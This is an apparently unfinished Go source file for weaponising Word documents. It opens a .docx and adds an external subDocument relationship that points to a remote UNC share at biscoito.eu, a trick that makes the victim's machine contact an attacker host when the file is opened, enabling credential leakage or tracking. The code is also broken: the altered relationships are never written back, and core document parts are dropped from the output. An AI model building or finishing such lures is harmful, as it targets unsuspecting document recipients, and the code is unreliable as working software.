package ooxml

import (
	"archive/zip"
	"encoding/xml"
	"fmt"
	"io"
	"log"
	"os"
	"sort"
	"strconv"
)

// TODO: Fix later
var zfs ZipFiles

func Initialize(fileName string) error {
	log.Println("Opening document...")

	r, err := zip.OpenReader(fileName)
	if err != nil {
		return err
	}
	defer r.Close()

	for _, f := range r.File {
		rc, err := f.Open()
		if err != nil {
			return err
		}

		zipData, err := io.ReadAll(rc)
		if err != nil {
			return err
		}
		rc.Close()

		err = EditPackage(f, zipData)
		if err != nil {
			return err
		}
	}

	if err = WritePackage("cu.docx"); err != nil {
		return err
	}

	return nil
}

func EditPackage(zipFile *zip.File, zipData []byte) error {
	switch zipFile.Name {
	case CDocumentXMLRels:
		rs := Relationships{}
		xml.Unmarshal(zipData, &rs)

		var idList []int
		for _, rel := range rs.Relationships {
			i, _ := strconv.Atoi(rel.Id[len(rel.Id)-1:])
			idList = append(idList, i)
		}
		sort.Ints(idList)
		targetId := idList[len(idList)-1] + 1

		rs.Relationships = append(rs.Relationships, Relation{
			Id:         fmt.Sprintf("rId%d", targetId),
			Type:       "http://schemas.openxmlformats.org/officeDocument/2006/relationships/subDocument",
			Target:     `file:///\\biscoito.eu\test\`,
			TargetMode: "External",
		})

		//parsedXml, err := xml.MarshalIndent(rs, "", "  ")
		//if err != nil {
		//	return err
		//}

	case CDocument:
	case CStyles:
	default:
		zfs.Files = append(zfs.Files, ZipFile{
			Name:     zipFile.Name,
			Contents: zipData,
		})
	}

	return nil
}

func WritePackage(fileName string) error {
	f, err := os.Create(fileName)
	if err != nil {
		return err
	}
	defer f.Close()

	w := zip.NewWriter(f)

	for _, file := range zfs.Files {
		zf, err := w.Create(file.Name)
		if err != nil {
			return err
		}

		if _, err = zf.Write([]byte(file.Contents)); err != nil {
			return err
		}
	}

	err = w.Close()
	if err != nil {
		return err
	}

	return nil
}
